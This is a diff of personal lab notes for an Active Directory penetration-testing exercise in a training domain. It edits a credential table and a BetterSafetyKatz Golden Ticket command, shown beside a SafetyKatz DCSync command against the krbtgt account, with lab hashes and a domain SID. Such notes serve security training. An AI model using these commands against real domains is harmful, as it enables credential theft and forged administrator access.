@@ -381,13 +381,13 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 | -------- | -------------------------------- |
 | Password | null                             |
 | NTLM     | 1698fafb9170e4798e43b77ac38cf0bf |
-|          | 5a056ff3f077232cfa8fee8d7054abb72f99f3c5a04bb46b6c6ae01964414d19                                 |
+| aes256_hmac | 5a056ff3f077232cfa8fee8d7054abb72f99f3c5a04bb46b6c6ae01964414d19 |
 
 
 *Using the secrets of krbtgt account, create a Golden ticket*
 Just use BetterSafetyKatz
 ```powershell
-C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:1698fafb9170e4798e43b77ac38cf0bf /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 ![[Pasted image 20231023113432.png]]
 To check if we succesfully got the golden ticket
